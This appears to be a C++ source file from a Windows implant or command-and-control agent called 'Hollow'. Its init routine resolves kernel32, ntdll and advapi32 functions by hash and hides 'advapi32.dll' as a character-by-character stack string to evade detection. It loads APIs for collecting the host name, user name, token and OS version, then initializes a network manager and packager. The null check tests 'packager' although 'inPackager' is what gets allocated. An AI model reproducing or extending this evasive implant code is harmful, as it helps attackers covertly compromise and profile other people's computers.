#include "../../includes/core/core.h"
#include "../../includes/net/net.h"
#include "../../includes/api/api.h"
#include "../../includes/byte/byte.h"




BOOL HollowInit() {

	HMODULE k32 = api::GetModule(api::hashs::dll::kernel32);
	HMODULE ntdll = api::GetModule(api::hashs::dll::ntdll);
	if (!k32 || !ntdll)
		return FALSE;

	auto pLocalAlloc = (decltype(hollow->Win32.LocalAlloc))api::GetProcAddress(k32, api::hashs::win32::LocalAlloc);
	if (!pLocalAlloc)
		return FALSE;

	hollow = (Hollow*)pLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Hollow));
	if (!hollow)
		return FALSE;


	hollow->Modules.k32 = k32;
	hollow->Modules.ntdll = ntdll;




	if (hollow->Modules.k32) {

		hollow->Win32.LocalAlloc = pLocalAlloc;
		hollow->Win32.LoadLibraryA = (decltype(hollow->Win32.LoadLibraryA))api::GetProcAddress(k32, api::hashs::win32::LoadLibraryA);
		hollow->Win32.GetProcAddress = (decltype(hollow->Win32.GetProcAddress))api::GetProcAddress(k32, api::hashs::win32::GetProcAddress);
		hollow->Win32.LocalFree = (decltype(hollow->Win32.LocalFree))api::GetProcAddress(k32, api::hashs::win32::LocalFree);
		hollow->Win32.LocalReAlloc = (decltype(hollow->Win32.LocalReAlloc))api::GetProcAddress(k32, api::hashs::win32::LocalReAlloc);
		hollow->Win32.GetTickCount = (decltype(hollow->Win32.GetTickCount))api::GetProcAddress(k32, api::hashs::win32::GetTickCount);
		hollow->Win32.GetModuleFileNameA = (decltype(hollow->Win32.GetModuleFileNameA))api::GetProcAddress(k32, api::hashs::win32::GetModuleFileNameA);
		hollow->Win32.CloseHandle = (decltype(hollow->Win32.CloseHandle))api::GetProcAddress(k32, api::hashs::win32::CloseHandle);
		hollow->Win32.GetComputerNameExA = (decltype(hollow->Win32.GetComputerNameExA))api::GetProcAddress(k32, api::hashs::win32::GetComputerNameExA);
		DEBUG_LOGA("[*] Loaded kernel32 apis");


	}


	if (hollow->Modules.ntdll) {
		hollow->ntapi.NtQueryInformationProcess = (decltype(hollow->ntapi.NtQueryInformationProcess))api::GetProcAddress(ntdll, api::hashs::ntdll::NtQueryInformationProcess);
		hollow->ntapi.NtQueryInformationToken = (decltype(hollow->ntapi.NtQueryInformationToken))api::GetProcAddress(ntdll, api::hashs::ntdll::NtQueryInformationToken);
		hollow->ntapi.NtOpenProcessToken = (decltype(hollow->ntapi.NtOpenProcessToken))api::GetProcAddress(ntdll, api::hashs::ntdll::NtOpenProcessToken);
		hollow->ntapi.RtlRandomEx = (decltype(hollow->ntapi.RtlRandomEx))api::GetProcAddress(ntdll, api::hashs::ntdll::RtlRandomEx);
		hollow->ntapi.RtlGetNtVersionNumbers = (decltype(hollow->ntapi.RtlGetNtVersionNumbers))api::GetProcAddress(ntdll, api::hashs::ntdll::RtlGetNtVersionNumbers);
		DEBUG_LOGA("[*] Loaded ntdll apis");

	}

	CHAR dll[13];
	dll[0] = 'a';
	dll[1] = 'd';
	dll[2] = 'v';
	dll[3] = 'a';
	dll[4] = 'p';
	dll[5] = 'i';
	dll[6] = '3';
	dll[7] = '2';
	dll[8] = '.';
	dll[9] = 'd';
	dll[10] = 'l';
	dll[11] = 'l';
	dll[12] = '\0';

	hollow->Modules.advapi = hollow->Win32.LoadLibraryA(dll);

	if (hollow->Modules.advapi) {
		hollow->Win32.GetUserNameA = (decltype(hollow->Win32.GetUserNameA))api::GetProcAddress(hollow->Modules.advapi, api::hashs::win32::GetUserNameA);
		DEBUG_LOGA("[*] Loaded advapi32 apis");

	}

	g_NetMgr = (NetMgr*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(NetMgr));
	inPackager = (Packager*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Packager));
	hollow->config = (Config*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Config));

	if (!g_NetMgr || !packager || !hollow->config)
		return FALSE;

	if (!g_NetMgr->Init())
		return FALSE;


	return TRUE;


}